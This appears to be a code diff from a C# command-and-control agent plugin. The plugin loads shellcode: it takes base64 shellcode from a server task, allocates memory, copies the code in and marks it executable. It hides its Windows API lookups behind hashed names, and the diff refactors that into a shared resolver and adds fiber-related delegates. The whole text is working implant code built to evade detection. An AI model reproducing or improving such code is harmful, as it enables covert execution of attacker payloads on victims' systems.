@@ -32,59 +32,30 @@ namespace Agent
         }
         private delegate bool VPDelegate(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
         private delegate IntPtr VADelegate(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+        private delegate IntPtr CTTFDelegate (IntPtr lpParameter);
+        private delegate IntPtr CFDelegate(int dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter);
+
         private IMessageManager messageManager { get; set; }
         private ITokenManager tokenManager { get; set; }
         private string output_task_id { get; set; }
-        private bool resolved = false;
-        private long key = 0x617468656E61;
-        private IntPtr vpFunc = IntPtr.Zero;
-        private IntPtr vaFunc = IntPtr.Zero;
-        Dictionary<string, string> map = new Dictionary<string, string>()
-        {
-            { "k32","A63CBAF3BECF39638EEBC81A422A5D00" },
-            { "va", "099F8A295CEEBF8CA978C7F2D3C29C65" },
-            { "vp", "784C68EEDB2E6D5931063D5348864AAD" }
-        };
         public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
         {
             this.messageManager = messageManager;
             this.tokenManager = tokenManager;
         }
-        private bool Resolve()
-        {
-            var k32Mod = Generic.GetLoadedModulePtr(map["k32"], key);
-           
-            if(k32Mod == IntPtr.Zero)
-            {
-                return resolved;
-            }
-
-            vpFunc = Generic.GetExportAddr(k32Mod, map["vp"], key);
-            vaFunc = Generic.GetExportAddr(k32Mod, map["va"], key);
-
-            if(vaFunc != IntPtr.Zero && vpFunc != IntPtr.Zero)
-            {
-                resolved = true;
-            }
-
-            return resolved;
-        }
         public async Task Execute(ServerJob job)
         {
 
-            if (!resolved)
+            List<string> resolvFuncs = new List<string>()
             {
-                if (!this.Resolve())
-                {
-                    await messageManager.AddResponse(new ResponseResult()
-                    {
-                        completed = true,
-                        user_output = "Failed to resolve functions",
-                        task_id = job.task.id,
-                        status = "success"
-                    });
-                    return;
-                }
+                "vp",
+                "va"
+            };
+
+            if (!Resolver.ResolveFuncs(resolvFuncs, "k32"))
+            {
+                await messageManager.WriteLine("Failed to get exports", job.task.id, true, "error");
+                return;
             }
 
             ShellcodeArgs args = JsonSerializer.Deserialize<ShellcodeArgs>(job.task.parameters);
@@ -101,14 +72,11 @@ namespace Agent
                 return;
             }
 
+
             byte[] buffer = Convert.FromBase64String(args.asm);
+            object[] vaParams = new object[] { IntPtr.Zero, (uint)buffer.Length, (uint)0x1000, (uint)0x04 };
+            IntPtr bufAddr = Generic.InvokeFunc<IntPtr>(Resolver.GetFunc("va"), typeof(VADelegate), ref vaParams);
 
-            //Allocate shellcode as RW
-            object[] vaParams = new object[] { IntPtr.Zero, (uint)buffer.Length, 0x1000, 0x04 };
-            IntPtr bufAddr = Generic.InvokeFunc<IntPtr>(vaFunc, typeof(VADelegate), ref vaParams);
-
-
-            //IntPtr bufAddr = Native.VirtualAlloc(IntPtr.Zero, (uint)buffer.Length, 0x1000, 0x04);
             if (bufAddr == IntPtr.Zero)
             {
                 await messageManager.AddResponse(new ResponseResult()
@@ -124,11 +92,9 @@ namespace Agent
             Marshal.Copy(buffer, 0, bufAddr, buffer.Length);
 
             uint oldProtect = 0;
+            object[] vpParams = new object[] { bufAddr, (UIntPtr)buffer.Length, (uint)0x20, oldProtect };
 
-            object[] vpParams = new object[] { bufAddr, (uint)buffer.Length, 0x20, oldProtect };
-
-            bool result = Generic.InvokeFunc<bool>(vpFunc, typeof(VPDelegate), ref vpParams);
-
+            bool result = Generic.InvokeFunc<bool>(Resolver.GetFunc("vp"), typeof(VPDelegate), ref vpParams);
             if (!result)
             {
                 await messageManager.AddResponse(new ResponseResult()
